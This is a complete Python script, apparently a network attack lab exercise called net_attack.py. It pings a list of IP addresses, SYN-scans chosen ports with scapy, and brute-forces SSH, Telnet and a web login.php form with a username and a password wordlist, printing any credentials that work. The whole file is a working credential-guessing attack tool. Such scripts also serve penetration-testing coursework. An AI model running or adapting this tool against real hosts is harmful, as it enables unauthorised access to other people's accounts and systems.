#!/usr/bin/python3

from scapy.all import *
from os import path
from shutil import copyfile
from telnetlib import Telnet
from paramiko import SSHClient, AutoAddPolicy
from requests import get, post

conf.verb = 0


def main():
    arguments = sys.argv[1:]
    number_of_arguments = len(arguments)
    if number_of_arguments < 8 or "-t" not in arguments or "-p" not in arguments or "-u" not in arguments or "-f" not in arguments:
        help()

    ip_file = arguments[arguments.index("-t") + 1]
    verify_file_exists(ip_file)

    ip_list = read_ip_list(ip_file)
    ip_list = [ip for ip in ip_list if is_reachable(ip)]
    if not ip_list:
        print("No reachable IP addresses found in list")
        exit()

    ports = arguments[arguments.index("-p") + 1]
    port_list = get_ports_from_input(ports)

    username = arguments[arguments.index("-u") + 1]
    password_file = arguments[arguments.index("-f") + 1]
    verify_file_exists(password_file)

    for ip in ip_list:
        for port in port_list:
            print("********** %s **********" % ip)
            port_open = scan_port(ip, port)
            print("Port %d is %s on %s" % (port, "open" if port_open else "closed", ip))
            if port_open:
                response = ""

                if port == 22:
                    response = bruteforce_ssh(ip, port, username, password_file)
                elif port == 23:
                    response = bruteforce_telnet(ip, port, username, password_file)
                elif port == 80:
                    response = bruteforce_web(ip, port, username, password_file)
                 
                if response:
                    print("Successfully logged into port %d with %s" % (port, response))


def scan_port(ip, port):
    pkt = IP(dst=ip) / TCP(dport=port, flags="S")
    ans, unans = sr(pkt, timeout=2)
    if len(ans) > 0:
        return "S" in str(ans[0][1][TCP].flags)
    else:
        return False


def bruteforce_telnet(ip, port, username, password_list_filename):
    response = ""

    login_prompt = encode_in_ascii("login:")
    username_input = encode_in_ascii("%s\n" % username)
    password_prompt = encode_in_ascii("Password:")
    welcome_output = encode_in_ascii("Welcome to")

    with open(password_list_filename) as reader:
        passwords = reader.readlines()
        for password in passwords:
            connection = Telnet(ip, port=port)
            connection.read_until(login_prompt)
            connection.write(username_input)
            connection.read_until(password_prompt)
            connection.write(encode_in_ascii(password))
            banner = connection.read_until(welcome_output, timeout=1)
            if welcome_output in banner:
                connection.close()
                response = "%s:%s" % (username, password.rstrip())
                break

            connection.close()

    return response


def bruteforce_ssh(ip, port, username, password_list_filename):
    response = ""
    with open(password_list_filename) as reader:
        passwords = reader.readlines()
        for password in passwords:
            password_clean = password.rstrip()
            try:
                client = SSHClient()
                client.set_missing_host_key_policy(AutoAddPolicy())
                client.connect(ip, username=username, password=password_clean)
                response = "%s:%s" % (username, password.rstrip())
                break
            except Exception: 
                pass
            finally:
                client.close()

    return response


def bruteforce_web(ip, port, username, password_list_filename):
    response = ""
    base_url = "http://%s:%d" % (ip, port)
    index_url = "%s/index.php" % base_url
    login_url = "%s/login.php" % base_url
    with open(password_list_filename) as reader:
        passwords = reader.readlines()
        for password in passwords:
            password_clean = password.rstrip()
            index_response = get(index_url)
            if index_response.status_code == 200: 
                login_response = post(login_url, data={"username":username, "password":password_clean})
                if "Welcome" in login_response.text:
                    response = "%s:%s" % (username, password.rstrip())

    return response


def read_ip_list(ip_file):
    ip_list = []
    with open(ip_file) as reader:
        ip_list = reader.read().splitlines()

    return ip_list


def is_reachable(ip):
    ans = sr1(IP(dst=ip, ttl=64) / ICMP(), timeout=2)
    return ans is not None


def get_ports_from_input(ports_input):
    ports = []
    ports_input_split = ports_input.split(",")
    for port in ports_input_split:
        if port.isdigit():
            ports.append(int(port))

    return ports


def verify_file_exists(file):
    if not path.isfile(file):
        print("Could not find file %s" % file)
        exit()


def encode_in_ascii(s):
    return s.encode("ascii")


def help():
    print("Example usage: ./net_attack.py -t my_ip_list.txt -p 22,23,25,80 -u admin -f my_password_list.txt")
    exit()


if __name__ == "__main__":
    main()
